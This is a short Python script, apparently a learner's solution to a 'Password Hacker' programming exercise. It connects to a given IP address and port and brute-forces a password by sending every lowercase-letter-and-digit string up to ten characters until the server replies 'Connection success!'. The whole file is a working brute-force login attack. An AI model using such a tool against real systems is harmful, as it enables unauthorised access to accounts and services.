# write your code here
import argparse
import itertools
import socket
import string

CHARSET = string.ascii_lowercase + string.digits


def gen_password(max_size=10):
    for chars in itertools.chain(*(itertools.product(CHARSET, repeat=n) for n in range(1, max_size+1))):
        yield "".join(chars)


def main():
    my_parser = argparse.ArgumentParser(description="Password Hacker:")
    my_parser.add_argument("ip_address", type=str, help="target IP address to hack password")
    my_parser.add_argument('port', type=int, help="target port associated with the IP address")

    args = my_parser.parse_args()

    with socket.socket() as sock:
        sock.connect((args.ip_address, args.port))

        for psswd in gen_password(max_size=10):
            sock.send(psswd.encode('utf-8'))
            response_message = sock.recv(1024).decode('utf-8')
            if response_message == "Connection success!":
                print(psswd)
                break
            if response_message == "Too many attempts":
                break


if __name__ == '__main__':
    main()

